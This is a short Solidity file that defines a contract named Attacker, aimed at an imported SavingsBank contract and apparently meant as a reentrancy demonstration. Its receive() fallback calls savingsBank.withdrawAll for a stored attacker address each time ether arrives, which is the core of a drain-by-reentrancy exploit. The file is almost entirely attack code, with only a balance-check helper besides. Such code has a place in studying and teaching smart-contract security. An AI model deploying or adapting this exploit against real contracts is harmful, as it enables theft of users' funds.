// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;
import "./SavingsBank.sol";

contract Attacker {
    SavingsBank public savingsBank;
    address attacker;

    constructor(address _savingsBankAddress, address _attackerAddress) {
        savingsBank = SavingsBank(_savingsBankAddress);
        attacker = _attackerAddress;
    }

    receive() external payable {
        savingsBank.withdrawAll(attacker);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
